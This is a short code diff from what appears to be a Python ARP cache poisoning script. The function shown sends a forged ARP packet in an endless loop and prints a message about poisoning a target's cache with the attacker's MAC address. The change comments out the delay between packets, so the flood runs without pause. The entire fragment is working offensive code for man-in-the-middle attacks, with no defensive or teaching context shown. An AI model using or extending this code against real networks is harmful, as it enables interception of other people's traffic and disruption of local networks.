@@ -27,7 +27,7 @@ def arp_poison(target_ip, victim_ip):
     packet = create_arp_packet(target_ip, victim_ip)
     send(packet)
     while(1):
-        time.sleep(5)
+        #time.sleep(5)
         send(packet)
         print("Posioning ARP Cache of "+target_ip+" with "+victim_ip+" and your MAC address.\n")
 
